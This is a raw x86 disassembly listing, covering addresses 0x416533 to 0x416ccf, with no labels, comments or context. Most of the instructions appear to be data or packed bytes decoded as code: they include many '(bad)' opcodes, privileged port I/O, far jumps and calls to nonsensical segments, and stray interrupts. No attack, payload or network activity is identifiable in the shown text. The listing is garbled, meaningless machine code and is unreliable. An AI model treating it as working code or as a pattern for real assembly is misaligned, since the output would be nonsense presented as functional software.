  416533:	inc    eax
  416534:	inc    edx
  416535:	or     BYTE PTR [ecx+0x2],al
  416538:	sbb    DWORD PTR [eax],0x40080046
  41653e:	or     DWORD PTR [eax],0x50106145
  416544:	add    al,0x80
  416546:	or     DWORD PTR [ecx-0x7f],edx
  416549:	dec    eax
  41654a:	add    DWORD PTR [edx],0x14
  41654d:	add    WORD PTR [eax],dx
  416550:	sub    ch,BYTE PTR [edx]
  416552:	pusha  
  416553:	inc    ecx
  416554:	ins    DWORD PTR es:[edi],dx
  416555:	add    BYTE PTR [eax],al
  416557:	sub    al,0x14
  416559:	or     BYTE PTR [eax],al
  41655b:	add    DWORD PTR [eax+0x8942100],eax
  416561:	bound  edx,QWORD PTR [eax]
  416563:	retf   0x4310
  416566:	inc    eax
  416567:	add    cl,ah
  416569:	or     BYTE PTR [ecx+0x0],dl
  41656c:	inc    eax
  41656d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41656e:	sub    al,BYTE PTR [eax+0x0]
  416571:	add    BYTE PTR [ebx+0x41d0020a],ch
  416577:	add    BYTE PTR [eax+ecx*1],al
  41657a:	add    BYTE PTR [edx],cl
  41657c:	add    BYTE PTR [edx],0x67
  41657f:	nop
  416580:	add    BYTE PTR [edx],ah
  416582:	add    BYTE PTR [eax],0x40
  416585:	adc    BYTE PTR [ecx],al
  416587:	inc    eax
  416588:	mov    DWORD PTR [ebx],ecx
  41658a:	add    BYTE PTR [edx+0x10a08204],dh
  416590:	add    BYTE PTR [esi-0x3f7e333e],dl
  416596:	test   DWORD PTR [ecx],eax
  416598:	inc    ecx
  416599:	add    al,0x14
  41659b:	add    BYTE PTR [eax],ah
  41659d:	push   ss
  41659e:	add    DWORD PTR [eax],0x54342b0
  4165a4:	into   
  4165a5:	add    DWORD PTR [ecx],0xd026012
  4165ab:	and    BYTE PTR [ebx],0x1
  4165ae:	and    BYTE PTR [eax],cl
  4165b0:	add    DWORD PTR [eax+0x100d0050],eax
  4165b6:	mov    al,cl
  4165b8:	add    dl,BYTE PTR [eax-0x68]
  4165bb:	sbb    BYTE PTR [ecx],al
  4165bd:	add    BYTE PTR [ecx+0x1],0x2
  4165c1:	inc    edx
  4165c2:	add    BYTE PTR [ebp+0x2],ah
  4165c5:	inc    ecx
  4165c6:	or     BYTE PTR [eax+0x48804280],al
  4165cc:	or     ch,ah
  4165ce:	add    BYTE PTR [eax+ebx*1],al
  4165d1:	inc    ebp
  4165d2:	add    BYTE PTR [eax],bl
  4165d4:	add    BYTE PTR [eax],al
  4165d6:	pusha  
  4165d7:	sub    al,BYTE PTR [eax]
  4165d9:	add    al,dh
  4165db:	xchg   edx,eax
  4165dc:	or     al,BYTE PTR [eax]
  4165de:	mov    ah,0x82
  4165e0:	and    DWORD PTR [eax+0x40],ebx
  4165e3:	add    BYTE PTR [eax+0xb],0x20
  4165e7:	xor    BYTE PTR [edx-0x333dac1c],dh
  4165ed:	dec    ecx
  4165ee:	inc    eax
  4165ef:	adc    BYTE PTR [ebx+0x44a58084],0x4
  4165f6:	add    DWORD PTR [eax],esp
  4165f8:	and    DWORD PTR [eax],eax
  4165fa:	push   esp
  4165fb:	add    BYTE PTR [eax],al
  4165fd:	and    DWORD PTR [eax],esi
  4165ff:	push   eax
  416600:	inc    edx
  416601:	and    al,0x41
  416603:	or     BYTE PTR [edi+0x1],al
  416606:	add    BYTE PTR [ebx+0x14487090],al
  41660c:	add    al,0x4
  41660e:	add    BYTE PTR [edx+eax*2],ah
  416611:	inc    eax
  416612:	inc    eax
  416613:	add    BYTE PTR [ecx+0x30],al
  416616:	add    DWORD PTR [eax+0x10100580],esp
  41661c:	add    al,0x24
  41661e:	sub    BYTE PTR [ebp-0x7f],cl
  416621:	inc    eax
  416622:	test   BYTE PTR [eax],al
  416624:	add    BYTE PTR [eax+0x40],al
  416627:	add    BYTE PTR [eax],al
  416629:	add    BYTE PTR [eax+0x41],dl
  41662c:	or     BYTE PTR [edx+0x9],cl
  41662f:	test   DWORD PTR [eax],ecx
  416631:	add    al,0x20
  416633:	push   eax
  416634:	inc    ecx
  416635:	add    BYTE PTR [edx],dl
  416637:	mov    BYTE PTR [eax],al
  416639:	inc    eax
  41663a:	add    BYTE PTR [eax+0x40],al
  41663d:	inc    eax
  41663e:	adc    BYTE PTR [eax],cl
  416640:	or     BYTE PTR [eax+eax*1],0x0
  416644:	add    DWORD PTR [eax+ecx*1],0x0
  416648:	inc    ecx
  416649:	inc    ecx
  41664a:	add    BYTE PTR [edx],ch
  41664c:	enter  0x808,0x86
  416650:	ret    
  416651:	adc    BYTE PTR [edx],al
  416653:	add    BYTE PTR [eax],al
  416655:	or     BYTE PTR [eax+eax*1+0x48400902],cl
  41665c:	inc    eax
  41665d:	and    BYTE PTR [eax],al
  41665f:	cmp    BYTE PTR [eax+eax*1],ah
  416662:	add    BYTE PTR [edx],al
  416664:	add    DWORD PTR [ebx],0x20008000
  41666a:	rol    BYTE PTR [eax-0x7bdc0000],1
  416670:	and    cl,BYTE PTR [ecx+0x0]
  416673:	xchg   BYTE PTR [eax],al
  416675:	add    BYTE PTR [eax],ch
  416677:	add    al,0x14
  416679:	popa   
  41667a:	add    al,BYTE PTR [eax]
  41667c:	jne    0x41667e
  41667e:	xor    eax,0x4a05c580
  416683:	inc    eax
  416684:	or     BYTE PTR [eax+0x34080834],al
  41668a:	or     al,BYTE PTR [edx+0x10270c15]
  416690:	add    BYTE PTR [eax],0x82
  416693:	add    BYTE PTR [eax+0x0],al
  416696:	add    BYTE PTR [esp+edx*1],al
  416699:	add    BYTE PTR ds:0x410000,ah
  41669f:	inc    edx
  4166a0:	add    ah,BYTE PTR [ecx]
  4166a2:	push   ebp
  4166a3:	or     BYTE PTR [ecx],ah
  4166a5:	push   edi
  4166a6:	fs inc ecx
  4166a8:	add    DWORD PTR [ecx+0x8],esp
  4166ab:	sbb    BYTE PTR [eax+0x1],al
  4166ae:	adc    bl,BYTE PTR [eax]
  4166b0:	xor    eax,DWORD PTR [ebx]
  4166b2:	add    ah,BYTE PTR [eax]
  4166b4:	add    BYTE PTR [edx+0x49],dl
  4166b7:	add    BYTE PTR [ecx],al
  4166b9:	add    BYTE PTR [ecx],al
  4166bb:	mov    ds:0x42c,al
  4166c0:	add    BYTE PTR [edi+0x41],ah
  4166c3:	add    BYTE PTR [edi-0x60fffff2],bl
  4166c9:	jne    0x41670c
  4166cb:	add    BYTE PTR [esi],bh
  4166cd:	sbb    eax,0x92dd0000
  4166d2:	inc    ecx
  4166d3:	add    BYTE PTR [edi+0x7c00000e],bl
  4166d9:	mov    eax,ds:0xe9f0041
  4166de:	add    BYTE PTR [eax],al
  4166e0:	sbb    esi,DWORD PTR [eax+0x1d3e0041]
  4166e6:	add    BYTE PTR [eax],al
  4166e8:	add    BYTE PTR [eax],al
  4166ea:	inc    edx
  4166eb:	add    BYTE PTR [edi],dh
  4166ed:	xchg   edx,eax
  4166ee:	add    BYTE PTR [eax],al
  4166f0:	aam    0xb0
  4166f2:	inc    edx
  4166f3:	add    BYTE PTR [edx+0x4bd],bl
  4166f9:	add    BYTE PTR [eax],al
  4166fb:	add    BYTE PTR [eax],al
  4166fd:	add    BYTE PTR [eax],al
  4166ff:	add    BYTE PTR [eax-0x19],bh
  416702:	mov    DWORD PTR [ecx+0x68],esi
  416705:	(bad)
  416709:	out    dx,al
  41670a:	sub    edi,DWORD PTR [ebx]
  41670c:	sub    edi,DWORD PTR [edi+0x4be67d07]
  416712:	push   edi
  416713:	mov    ah,0x98
  416715:	and    BYTE PTR [edi-0x45bedbf4],ch
  41671b:	and    edi,edx
  41671d:	xor    esi,DWORD PTR [edi-0xd61c354]
  416723:	fisubr WORD PTR ds:0xdd4fd428
  416729:	aas    
  41672a:	in     al,0x89
  41672c:	push   eax
  41672d:	mov    ah,0x0
  41672f:	add    ch,bh
  416731:	add    BYTE PTR [esi],0xea
  416734:	dec    ebp
  416735:	mov    dl,0xfc
  416737:	repz push eax
  416739:	scas   eax,DWORD PTR es:[edi]
  41673a:	or     edx,edi
  41673c:	mov    edi,0x60869cef
  416741:	repz pop edx
  416743:	xchg   ebp,ebx
  416745:	xchg   edi,eax
  416746:	pushf  
  416747:	dec    edi
  416748:	ds pusha 
  41674a:	or     al,BYTE PTR [edi-0x6f68c023]
  416750:	dec    eax
  416751:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416752:	or     DWORD PTR [edi-0xb3553be],eax
  416758:	or     esp,DWORD PTR [ebx+eax*1+0xbadddb9]
  41675f:	repz dec ecx
  416761:	lods   al,BYTE PTR ds:[esi]
  416762:	(bad)
  416765:	lods   al,BYTE PTR ds:[esi]
  416766:	xchg   edi,eax
  416767:	jmp    0xcb9d:0xdbf82c68
  41676e:	in     al,dx
  41676f:	mov    ecx,0x8ea38d68
  416774:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416775:	mov    ch,0xa1
  416777:	rcl    edi,0xee
  41677a:	or     al,0x12
  41677c:	sub    al,0xcb
  41677e:	data16 test BYTE PTR [edi-0x204d97c9],ah
  416785:	or     DWORD PTR [edx-0x47],0x8f0b28ae
  41678c:	adc    ah,BYTE PTR [eax+0x1a]
  41678f:	mov    edx,cs
  416791:	arpl   WORD PTR ds:[edi],di
  416794:	shl    BYTE PTR [edx],1
  416796:	test   ah,bh
  416798:	lods   eax,DWORD PTR ds:[esi]
  416799:	leave  
  41679a:	fstp   TBYTE PTR [ebp-0x7]
  41679d:	mov    al,ds:0x3fe5ab60
  4167a2:	in     al,dx
  4167a3:	dec    eax
  4167a4:	leave  
  4167a5:	rcr    DWORD PTR [ebx+0x12],0xdb
  4167a9:	aas    
  4167aa:	xchg   edi,eax
  4167ab:	jg     0x416751
  4167ad:	lds    ecx,FWORD PTR [edi-0x67c02319]
  4167b3:	test   ch,bl
  4167b5:	aas    
  4167b6:	sbb    al,BYTE PTR [edi+0x3a63fe5]
  4167bc:	test   BYTE PTR [eax-0x69],al
  4167bf:	or     ch,BYTE PTR [eax-0x4b]
  4167c2:	lahf   
  4167c3:	xchg   BYTE PTR [edx-0x23eb69c0],bl
  4167c9:	stc    
  4167ca:	xchg   edi,eax
  4167cb:	test   ebp,ebx
  4167cd:	aas    
  4167ce:	inc    ebx
  4167cf:	mov    BYTE PTR [esi],bl
  4167d1:	mov    dl,0x9d
  4167d3:	ret    0xb737
  4167d6:	cdq    
  4167d7:	ret    0xeabd
  4167da:	mov    eax,ds:0xe04951b2
  4167df:	inc    esi
  4167e0:	popa   
  4167e1:	ret    0x9597
  4167e4:	(bad)  [edx]
  4167e6:	jg     0x41676f
  4167e8:	xchg   edx,eax
  4167e9:	inc    eax
  4167ea:	xchg   esi,eax
  4167eb:	adc    al,0xdc
  4167ed:	imul   edx,DWORD PTR [ebp+0xd41dc86],0xa
  4167f4:	inc    edi
  4167f5:	inc    eax
  4167f6:	in     eax,dx
  4167f7:	stc    
  4167f8:	dec    eax
  4167f9:	aas    
  4167fa:	xchg   edi,eax
  4167fb:	outs   dx,DWORD PTR ds:[esi]
  4167fc:	lds    dx,DWORD PTR [ebx-0x3c0237a]
  416803:	test   dl,dh
  416805:	outs   dx,DWORD PTR ds:[esi]
  416806:	xchg   edi,eax
  416807:	adc    ebp,ebx
  416809:	retf   0x86e9
  41680c:	push   0xb792a392
  416811:	sub    ebx,DWORD PTR [esi+0x6a7aef11]
  416817:	adc    ch,BYTE PTR [ebx]
  416819:	retf   
  41681a:	or     ebx,edi
  41681c:	push   0xfffffffd
  41681e:	xchg   edi,eax
  41681f:	mov    dh,0xdc
  416821:	aas    
  416822:	push   ecx
  416823:	xchg   dh,bl
  416825:	aas    
  416826:	xchg   edi,eax
  416827:	xchg   bl,dl
  416829:	mov    ah,0x7f
  41682b:	xchg   edx,eax
  41682c:	mov    bh,BYTE PTR [eax+ebx*8-0x14]
  416830:	jecxz  0x4168ad
  416832:	icebp  
  416833:	clc    
  416834:	fild   QWORD PTR [ebx+0x77]
  416837:	(bad)  
  416838:	out    0xff,eax
  41683a:	or     esi,DWORD PTR [ecx]
  41683c:	es mov ah,0x6b
  41683f:	mov    edi,es
  416841:	int    0x4c
  416843:	jb     0x416821
  416845:	aas    
  416846:	xchg   edi,eax
  416847:	xchg   ebx,ebx
  416849:	ret    
  41684a:	xchg   esi,eax
  41684b:	mov    dl,0x53
  41684d:	add    eax,0x28338802
  416852:	test   eax,0xd33fdc86
  416857:	test   ecx,ebx
  416859:	ds xchg edi,eax
  41685b:	or     al,0x52
  41685d:	cmc    
  41685e:	and    al,BYTE PTR [esi-0x36e3370b]
  416864:	fstp   TBYTE PTR [edi]
  416866:	xchg   edi,eax
  416867:	jg     0x4168d1
  416869:	lds    ecx,FWORD PTR [edi+0x613fdce8]
  41686f:	test   ecx,esp
  416871:	aas    
  416872:	in     al,dx
  416873:	dec    eax
  416874:	leave  
  416875:	jae    0x4168ce
  416877:	adc    dl,BYTE PTR [esi]
  416879:	test   DWORD PTR [edi-0xb34d81a],ebx
  41687f:	cli    
  416880:	loopne 0x41681c
  416882:	ror    DWORD PTR [esi+0x119ab838],cl
  416888:	in     eax,0xca
  41688a:	or     ah,ah
  41688c:	loopne 0x416842
  41688e:	lahf   
  41688f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416890:	scas   eax,DWORD PTR es:[edi]
  416891:	jnp    0x41687d
  416893:	mov    ecx,0x9f447150
  416898:	and    cl,BYTE PTR [eax+0x1]
  41689b:	mov    ch,BYTE PTR ds:0xdc875d28
  4168a1:	aas    
  4168a2:	rol    DWORD PTR [ecx+ebp*8-0x3734654d],1
  4168a9:	daa    
  4168aa:	imul   ecx,ecx,0x68bb92e0
  4168b0:	xor    cl,BYTE PTR [eax-0x5a]
  4168b3:	mov    edi,ebx
  4168b5:	add    BYTE PTR [eax+0x3e],bh
  4168b8:	loopne 0x41683c
  4168ba:	mov    bl,0x88
  4168bc:	and    cl,BYTE PTR [eax+0x22]
  4168bf:	mov    ah,al
  4168c1:	test   BYTE PTR [edi-0x4c9bde7a],bl
  4168c7:	montmul (bad)
  4168c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168c9:	add    ah,BYTE PTR [eax-0x7c34cd19]
  4168cf:	xchg   DWORD PTR [edx+0x4c],edx
  4168d2:	xchg   esi,eax
  4168d3:	xchg   ch,ah
  4168d5:	daa    
  4168d6:	xor    ah,bh
  4168d8:	fdivr  QWORD PTR [edi]
  4168da:	popa   
  4168db:	xchg   cl,ah
  4168dd:	arpl   WORD PTR [esi],bx
  4168df:	push   cs
  4168e0:	add    DWORD PTR [eax+0x59],ecx
  4168e3:	retf   
  4168e4:	fst    QWORD PTR [edx+eiz*1-0x7bfb9f75]
  4168eb:	jae    0x4168b2
  4168ed:	inc    eax
  4168ee:	xchg   edi,eax
  4168ef:	out    0xdd,al
  4168f1:	rol    bl,0x86
  4168f4:	outs   dx,DWORD PTR ds:[esi]
  4168f5:	push   ebx
  4168f6:	xlat   BYTE PTR ds:[ebx]
  4168f7:	stos   BYTE PTR es:[edi],al
  4168f8:	cmp    ch,cl
  4168fa:	sbb    al,BYTE PTR [edi-0x7b688012]
  416900:	(bad)
  416903:	xlat   BYTE PTR ds:[ebx]
  416904:	fmul   st(1),st
  416906:	fadd   QWORD PTR [ebp-0x7cf7e8bb]
  41690c:	adc    al,0x3f
  41690e:	or     eax,0x969dc52b
  416913:	sbb    esp,0xffffffc9
  416916:	fadd   QWORD PTR [ebp+0x7f288a45]
  41691c:	aam    0x3f
  41691e:	or     eax,0x968dc51e
  416923:	sbb    esp,0xffffffc9
  416926:	fadd   QWORD PTR [ebp+0x7b938568]
  41692c:	sbb    eax,0x2d89a67c
  416931:	push   esp
  416932:	and    al,0x3e
  416934:	fist   WORD PTR [edi+0x22]
  416937:	retf   
  416938:	jmp    0x6718557f
  41693d:	xchg   ebp,eax
  41693e:	xchg   DWORD PTR [ebx-0x75dfafd3],eax
  416944:	leave  
  416945:	retf   
  416946:	adc    al,0xdc
  416948:	push   0xd47387b5
  41694d:	mov    ah,0xfc
  41694f:	rcr    DWORD PTR [ecx],0x28
  416952:	or     eax,0x24466833
  416957:	jle    0x416966
  416959:	inc    esp
  41695a:	ror    dl,cl
  41695c:	aad    0xb5
  41695e:	or     esp,0xfffffffd
  416961:	aas    
  416962:	xchg   edi,eax
  416963:	aas    
  416964:	push   0xffffff96
  416966:	xchg   esp,eax
  416967:	xchg   DWORD PTR [ebx-0x3f],eax
  41696a:	rcl    eax,1
  41696c:	out    0xb3,al
  41696e:	fwait
  41696f:	lock shr DWORD PTR [ebx],cl
  416972:	jo     0x4169dd
  416974:	pop    ebp
  416975:	jp     0x4169f6
  416977:	shl    ebp,1
  416979:	retf   0xfbe1
  41697c:	push   0xffffff8c
  41697e:	test   al,0x87
  416980:	sbb    BYTE PTR [ebp+0x7ae98c87],cl
  416986:	in     al,0xf8
  416988:	push   eax
  416989:	inc    edi
  41698a:	shl    BYTE PTR [edx-0x2f],cl
  41698d:	mov    ah,0x99
  41698f:	rcl    DWORD PTR [edi+0x6d71d1c1],cl
  416995:	shl    BYTE PTR [edi],1
  416997:	pop    ss
  416998:	repz retf 0xfa99
  41699c:	int    0x30
  41699e:	mov    BYTE PTR [edx+ebx*1+0x2d76e790],ch
  4169a5:	mov    ch,0x9d
  4169a7:	(bad)  
  4169a8:	push   edi
  4169a9:	add    DWORD PTR ds:[edi],0xffffffe2
  4169ad:	sub    bl,BYTE PTR [ebx+edi*8-0x61]
  4169b1:	inc    esp
  4169b2:	xchg   esi,eax
  4169b3:	or     bh,BYTE PTR [esi]
  4169b5:	or     DWORD PTR [edx+0x59],ebx
  4169b8:	fst    QWORD PTR [edx+eiz*1+0xccb3d8b]
  4169bf:	jae    0x416a29
  4169c1:	mov    ebp,0xc08f929f
  4169c6:	retf   0x8182
  4169c9:	repz cdq 
  4169cb:	popa   
  4169cc:	dec    edx
  4169cd:	inc    eax
  4169ce:	xchg   edi,eax
  4169cf:	outs   dx,BYTE PTR ds:[esi]
  4169d0:	push   eax
  4169d1:	ss retf 
  4169d3:	xchg   ch,al
  4169d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169d6:	xchg   edi,eax
  4169d7:	dec    edi
  4169d8:	fnsave [edx+0x289d86b3]
  4169de:	repz mov ecx,0x870a3fdd
  4169e4:	nop
  4169e5:	inc    edx
  4169e6:	fsubr  DWORD PTR [ecx+0x36e727ed]
  4169ec:	fnstsw WORD PTR [edi]
  4169ee:	test   eax,0xd375086
  4169f3:	inc    edi
  4169f4:	xchg   DWORD PTR [ebx],ebp
  4169f6:	ins    BYTE PTR es:[edi],dx
  4169f7:	(bad)  
  4169f8:	sub    al,BYTE PTR [eax-0x69]
  4169fb:	outs   dx,BYTE PTR ds:[esi]
  4169fc:	or     BYTE PTR [ebx],cl
  4169fe:	or     eax,0x9782c587
  416a03:	xchg   esi,eax
  416a04:	(bad)  [edx]
  416a06:	rol    BYTE PTR [esi+0x330c28ae],0xf0
  416a0d:	or     BYTE PTR [ebx+0x58886ed4],al
  416a13:	mov    ds:0x677febe5,eax
  416a18:	fnstsw WORD PTR [edi]
  416a1a:	xchg   edi,eax
  416a1b:	mov    dl,0xdd
  416a1d:	mov    esp,0x4a50c397
  416a22:	pop    ss
  416a23:	xchg   edx,esp
  416a25:	mov    dl,0x9d
  416a27:	adc    ch,0xbf
  416a2a:	push   cs
  416a2b:	or     bl,BYTE PTR [esi]
  416a2d:	sub    DWORD PTR [ecx+ecx*4],0x1198f3a2
  416a34:	push   0xd0dcc337
  416a39:	in     al,0xf5
  416a3b:	jbe    0x416aa8
  416a3d:	inc    edx
  416a3e:	imul   esi,DWORD PTR [edx-0x1e],0xeffbadc9
  416a45:	adc    DWORD PTR [ebx-0x33],ebx
  416a48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a49:	cmp    DWORD PTR [edi-0x46],0x75973fdc
  416a50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a51:	sub    BYTE PTR [edi-0x66],bh
  416a54:	fdivr  QWORD PTR [edi]
  416a56:	or     al,BYTE PTR [esi+0x79136ba0]
  416a5c:	add    eax,0xf9ab13c9
  416a61:	mov    al,ds:0x3fe5ab60
  416a66:	in     al,dx
  416a67:	dec    eax
  416a68:	leave  
  416a69:	ret    
  416a6a:	pop    ebx
  416a6b:	adc    bh,BYTE PTR ds:0x276dccb
  416a71:	inc    eax
  416a72:	xchg   DWORD PTR [edi-0x79e75924],ecx
  416a78:	sub    bl,BYTE PTR [edx-0x6f9740f4]
  416a7e:	rcr    DWORD PTR [ecx+0x7a740d7],cl
  416a84:	fnsave [edx+0x7c5e869f]
  416a8a:	cdq    
  416a8b:	in     al,dx
  416a8c:	and    dh,BYTE PTR [esi+ebx*4-0x68b0222a]
  416a93:	mov    bl,0xc8
  416a95:	pop    ds
  416a96:	and    DWORD PTR [edi-0x3467d81b],eax
  416a9c:	fnstsw WORD PTR [edi]
  416a9e:	sbb    BYTE PTR [edi-0x4d5380ff],al
  416aa4:	fstp   QWORD PTR [edx+0x51cec724]
  416aaa:	xlat   BYTE PTR ds:[ebx]
  416aab:	or     DWORD PTR ds:0xdc878828,ebp
  416ab1:	aas    
  416ab2:	and    DWORD PTR [ebx-0x34400633],eax
  416ab8:	fnstsw WORD PTR [edi]
  416aba:	call   0x6611:0xd751ba8c
  416ac1:	lea    ecx,[edi-0x6857e279]
  416ac7:	lock fnstsw WORD PTR [edi]
  416aca:	call   0xe1e94885
  416acf:	lock stos DWORD PTR es:[edi],eax
  416ad1:	dec    ecx
  416ad2:	xchg   esi,eax
  416ad3:	xchg   esp,eax
  416ad4:	int    0x28
  416ad6:	mov    bh,ah
  416ad8:	fdivr  QWORD PTR [edi]
  416ada:	and    DWORD PTR [ecx+ebx*8-0x1133b533],eax
  416ae1:	jg     0x416a7a
  416ae3:	inc    esi
  416ae4:	pop    edx
  416ae5:	cmp    al,0x23
  416ae7:	adc    dl,ch
  416ae9:	inc    ebx
  416aea:	jbe    0x416ac0
  416aec:	mov    ebx,0x60b23c33
  416af1:	fsubr  DWORD PTR [ebx+edx*1-0x3887c123]
  416af8:	nop
  416af9:	sub    BYTE PTR [edi+0x4b3edd13],ch
  416aff:	(bad)  
  416b00:	out    dx,al
  416b01:	jg     0x416a9a
  416b03:	arpl   bp,ax
  416b05:	sahf   
  416b06:	xchg   ebx,eax
  416b07:	fstp   st(4)
  416b09:	jnp    0x416b25
  416b0b:	xchg   dh,ch
  416b0d:	jg     0x416aa6
  416b0f:	bound  esp,QWORD PTR [bp+di-0x67]
  416b13:	xchg   ebp,eax
  416b14:	fnstsw WORD PTR [esi]
  416b16:	dec    ebx
  416b17:	xchg   esi,ebp
  416b19:	jg     0x416ab2
  416b1b:	imul   ebx,DWORD PTR ds:0x99f0c8a8,0xffffffbf
  416b22:	xchg   esi,eax
  416b23:	sti    
  416b24:	int    0x28
  416b26:	cmp    bh,ah
  416b28:	fdivr  QWORD PTR [edi]
  416b2a:	and    DWORD PTR [ecx+edx*8+0x61cc574b],eax
  416b31:	inc    ebx
  416b32:	cdq    
  416b33:	xchg   ebp,eax
  416b34:	(bad)  
  416b36:	pop    DWORD PTR [edi-0x22ecd7cc]
  416b3c:	fdivr  QWORD PTR [edi]
  416b3e:	rol    DWORD PTR [edx+eax*8-0x13f628af],cl
  416b45:	les    eax,FWORD PTR [ebp-0x18c02279]
  416b4b:	xchg   ebp,eax
  416b4d:	push   esi
  416b4e:	xchg   ebx,eax
  416b4f:	(bad)  
  416b51:	jnp    0x416b6d
  416b53:	xchg   dh,ch
  416b55:	jg     0x416aee
  416b57:	outs   dx,DWORD PTR ds:[esi]
  416b58:	bound  ebx,QWORD PTR [ebx]
  416b5a:	cdq    
  416b5b:	xchg   ebp,eax
  416b5c:	(bad)  
  416b5e:	or     al,0x87
  416b60:	push   0x198f8bbd
  416b65:	inc    eax
  416b66:	xchg   edi,eax
  416b67:	aas    
  416b68:	push   ss
  416b69:	dec    esp
  416b6a:	rol    BYTE PTR [esi-0x6c3cd21],1
  416b70:	push   edx
  416b71:	dec    eax
  416b72:	and    dl,BYTE PTR [edx]
  416b74:	rol    DWORD PTR [ebx+0x16],1
  416b77:	add    al,0xe0
  416b79:	mov    ch,0xd3
  416b7b:	ret    0x8668
  416b7e:	lods   eax,DWORD PTR ds:[esi]
  416b7f:	in     al,dx
  416b80:	xchg   WORD PTR [ebp-0x64cbd514],bp
  416b87:	adc    DWORD PTR [ecx],ebx
  416b89:	stos   BYTE PTR es:[edi],al
  416b8a:	xchg   edi,eax
  416b8b:	iret   
  416b8c:	inc    edi
  416b8d:	adc    BYTE PTR [esi+0xd3f2ddb],0xf8
  416b94:	inc    ebp
  416b95:	outs   dx,DWORD PTR ds:[esi]
  416b96:	push   es
  416b97:	(bad)  
  416b98:	in     eax,dx
  416b99:	ds or  eax,0x946bc58d
  416b9f:	ja     0x416b7d
  416ba1:	cwde   
  416ba2:	and    al,BYTE PTR [esi+0x40ccae5]
  416ba8:	push   0x197a9b0e
  416bad:	retf   
  416bae:	loopne 0x416b84
  416bb0:	shl    ah,1
  416bb2:	and    bl,bl
  416bb4:	in     eax,0x42
  416bb6:	repnz jecxz 0x416ba5
  416bb9:	mul    dl
  416bbb:	ret    0xf6ec
  416bbe:	or     cl,BYTE PTR [ebp-0x654a4b96]
  416bc4:	xor    edx,DWORD PTR [ecx+0x42e59f22]
  416bca:	adc    eax,0x9f8e6804
  416bcf:	xchg   edx,eax
  416bd0:	and    BYTE PTR [eax-0x21],bh
  416bd3:	adc    DWORD PTR [ebp-0x5a7597c9],esp
  416bd9:	add    DWORD PTR [ecx-0x74ffef56],eax
  416bdf:	mov    DWORD PTR [eax-0x72],ebp
  416be2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416be3:	xor    DWORD PTR [ebx+0x4c],ebx
  416be6:	and    dl,BYTE PTR [edx]
  416be8:	icebp  
  416be9:	inc    edx
  416bea:	or     al,0xfd
  416bec:	loopne 0x416baa
  416bee:	lahf   
  416bef:	jp     0x416b72
  416bf1:	cdq    
  416bf2:	cmc    
  416bf3:	jns    0x416b98
  416bf5:	push   0xb5dc0a79
  416bfa:	mov    edx,DWORD PTR [ebx+0x7a]
  416bfd:	pop    esi
  416bfe:	add    ch,bh
  416c00:	fdiv   QWORD PTR [ebp+0x3ca1ea87]
  416c06:	xchg   edi,eax
  416c07:	outs   dx,DWORD PTR ds:[esi]
  416c08:	push   0xdd861bcb
  416c0d:	aas    
  416c0e:	jp     0x416b97
  416c10:	push   0xddf217db
  416c15:	aas    
  416c16:	call   0xe8e4:0xacae586
  416c1d:	xor    eax,0xb4e0930c
  416c22:	lahf   
  416c23:	loope  0x416bea
  416c25:	mov    ecx,0x4bdcdd92
  416c2a:	push   edi
  416c2b:	xchg   bh,ch
  416c2d:	xchg   ebp,eax
  416c2e:	(bad)  
  416c2f:	sti    
  416c30:	call   0x8030:0x5213d701
  416c37:	xchg   cl,bl
  416c39:	aas    
  416c3a:	xchg   edi,eax
  416c3b:	sbb    BYTE PTR [ebp-0x526e314c],bl
  416c41:	retf   
  416c42:	adc    dl,BYTE PTR [edx]
  416c44:	push   0x5296a273
  416c49:	inc    edx
  416c4a:	and    bh,BYTE PTR [ebp-0x20]
  416c4d:	mov    ah,0x9f
  416c4f:	jge    0x416cab
  416c51:	dec    eax
  416c52:	inc    esp
  416c53:	mov    bl,BYTE PTR [ebp-0x686e494c]
  416c59:	xor    BYTE PTR [edi-0x23bd1d6b],dh
  416c5f:	clc    
  416c60:	sbb    eax,0x2f8ee980
  416c65:	test   al,0x96
  416c67:	xlat   BYTE PTR ds:[ebx]
  416c68:	pop    ecx
  416c69:	or     DWORD PTR [edi-0xdd7325a],edx
  416c6f:	sti    
  416c70:	fdivr  QWORD PTR [edi]
  416c72:	repnz or al,0x1c
  416c76:	sbb    esi,DWORD PTR [edx]
  416c78:	icebp  
  416c79:	sub    dh,BYTE PTR [esi]
  416c7b:	dec    edx
  416c7c:	xor    cl,BYTE PTR [eax+0x22]
  416c7f:	adc    ah,ch
  416c81:	inc    edx
  416c82:	repnz jecxz 0x416c8d
  416c85:	xchg   ebx,eax
  416c86:	retf   
  416c87:	ret    0xa62d
  416c8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c8b:	cli    
  416c8c:	inc    eax
  416c8d:	push   esi
  416c8e:	xchg   edi,eax
  416c8f:	inc    eax
  416c90:	and    eax,0xddf952c3
  416c95:	aas    
  416c96:	xchg   edi,eax
  416c97:	sub    dl,BYTE PTR [ecx+0x7f]
  416c9a:	and    al,BYTE PTR [edi-0x3b5bd1b]
  416ca0:	fnstsw WORD PTR [edi]
  416ca2:	xchg   edi,eax
  416ca3:	sbb    eax,DWORD PTR es:[ebx+0x14]
  416ca7:	adc    ch,BYTE PTR [eax-0x72]
  416caa:	fwait
  416cab:	mov    es,esi
  416cad:	dec    eax
  416cae:	push   0x4467c00a
  416cb3:	jo     0x416cf8
  416cb5:	in     eax,dx
  416cb6:	std    
  416cb7:	xor    ebx,ebp
  416cb9:	outs   dx,DWORD PTR ds:[esi]
  416cba:	or     esi,DWORD PTR [eax]
  416cbc:	add    bh,BYTE PTR [edi]
  416cbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cbf:	mov    ds,ebp
  416cc1:	inc    eax
  416cc2:	stos   DWORD PTR es:[edi],eax
  416cc3:	xchg   BYTE PTR [edi-0x1a40dcd2],bh
  416cc9:	inc    edx
  416cca:	sbb    cl,ah
  416ccc:	fnstsw WORD PTR [edi]
  416cce:	xchg   edi,eax
  416ccf:	es pusha 
